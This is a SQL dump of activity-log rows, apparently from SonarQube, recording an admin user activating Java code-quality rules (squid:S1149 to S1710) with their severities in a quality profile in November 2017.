INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2387, '2017-11-20 12:17:00.324', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDekbbGRdfPp-rC3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2388, '2017-11-20 12:17:00.371', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDfTbbGRdfPp-rC4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2389, '2017-11-20 12:17:00.423', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDgHbbGRdfPp-rC5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2390, '2017-11-20 12:17:00.458', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDgqbbGRdfPp-rC6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2391, '2017-11-20 12:17:00.489', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDhJbbGRdfPp-rC7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2392, '2017-11-20 12:17:00.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDhmbbGRdfPp-rC8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2393, '2017-11-20 12:17:00.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDh4bbGRdfPp-rC9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2394, '2017-11-20 12:17:00.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDiSbbGRdfPp-rC-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2395, '2017-11-20 12:17:00.594', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDiybbGRdfPp-rC_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2396, '2017-11-20 12:17:00.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDjZbbGRdfPp-rDA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2397, '2017-11-20 12:17:00.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDj_bbGRdfPp-rDB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2398, '2017-11-20 12:17:00.713', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDkpbbGRdfPp-rDC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2399, '2017-11-20 12:17:00.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDlQbbGRdfPp-rDD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2400, '2017-11-20 12:17:00.809', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDmJbbGRdfPp-rDE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2401, '2017-11-20 12:17:00.862', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDm-bbGRdfPp-rDF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2402, '2017-11-20 12:17:00.899', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDnjbbGRdfPp-rDG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2403, '2017-11-20 12:17:00.928', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDoAbbGRdfPp-rDH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2404, '2017-11-20 12:17:00.964', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDokbbGRdfPp-rDI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2405, '2017-11-20 12:17:00.991', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDo_bbGRdfPp-rDJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2406, '2017-11-20 12:17:01.051', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDp7bbGRdfPp-rDK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2407, '2017-11-20 12:17:01.092', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDqkbbGRdfPp-rDL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2408, '2017-11-20 12:17:01.121', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDrBbbGRdfPp-rDM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2409, '2017-11-20 12:17:01.161', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDrpbbGRdfPp-rDN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2410, '2017-11-20 12:17:01.202', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDsSbbGRdfPp-rDO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2411, '2017-11-20 12:17:01.233', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDsxbbGRdfPp-rDP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2412, '2017-11-20 12:17:01.288', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDtobbGRdfPp-rDQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2413, '2017-11-20 12:17:01.352', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDuobbGRdfPp-rDR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2414, '2017-11-20 12:17:01.423', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDvvbbGRdfPp-rDS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2415, '2017-11-20 12:17:01.509', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDxFbbGRdfPp-rDT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2416, '2017-11-20 12:17:01.606', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDymbbGRdfPp-rDU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2417, '2017-11-20 12:17:01.643', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDzKbbGRdfPp-rDV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2418, '2017-11-20 12:17:01.679', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXDzvbbGRdfPp-rDW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2419, '2017-11-20 12:17:01.716', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD0UbbGRdfPp-rDX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2420, '2017-11-20 12:17:01.754', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD06bbGRdfPp-rDY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2421, '2017-11-20 12:17:01.791', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD1fbbGRdfPp-rDZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2422, '2017-11-20 12:17:01.833', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD2JbbGRdfPp-rDa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2423, '2017-11-20 12:17:01.889', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD3BbbGRdfPp-rDb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2424, '2017-11-20 12:17:01.926', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD3mbbGRdfPp-rDc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2425, '2017-11-20 12:17:01.954', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD4CbbGRdfPp-rDd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2426, '2017-11-20 12:17:01.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD4bbbGRdfPp-rDe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2427, '2017-11-20 12:17:02.006', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD42bbGRdfPp-rDf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2428, '2017-11-20 12:17:02.022', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD5GbbGRdfPp-rDg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2429, '2017-11-20 12:17:02.046', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD5ebbGRdfPp-rDh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2430, '2017-11-20 12:17:02.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD53bbGRdfPp-rDi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2431, '2017-11-20 12:17:02.094', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD6ObbGRdfPp-rDj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2432, '2017-11-20 12:17:02.118', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD6mbbGRdfPp-rDk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2433, '2017-11-20 12:17:02.143', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD6_bbGRdfPp-rDl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2434, '2017-11-20 12:17:02.159', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD7PbbGRdfPp-rDm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2435, '2017-11-20 12:17:02.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD72bbGRdfPp-rDn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2436, '2017-11-20 12:17:02.216', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD8IbbGRdfPp-rDo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2437, '2017-11-20 12:17:02.246', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD8mbbGRdfPp-rDp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2438, '2017-11-20 12:17:02.276', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD9EbbGRdfPp-rDq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2439, '2017-11-20 12:17:02.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD9hbbGRdfPp-rDr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2440, '2017-11-20 12:17:02.338', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD-CbbGRdfPp-rDs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2441, '2017-11-20 12:17:02.387', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD-zbbGRdfPp-rDt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2442, '2017-11-20 12:17:02.452', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXD_0bbGRdfPp-rDu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2443, '2017-11-20 12:17:02.526', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEA-bbGRdfPp-rDv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2444, '2017-11-20 12:17:02.572', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEBsbbGRdfPp-rDw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2445, '2017-11-20 12:17:02.618', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXECabbGRdfPp-rDx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2446, '2017-11-20 12:17:02.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEC_bbGRdfPp-rDy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2447, '2017-11-20 12:17:02.691', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEDibbGRdfPp-rDz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2448, '2017-11-20 12:17:02.737', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEERbbGRdfPp-rD0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2449, '2017-11-20 12:17:02.772', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEE0bbGRdfPp-rD1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2450, '2017-11-20 12:17:02.813', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-001-09470;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXEFdbbGRdfPp-rD2');
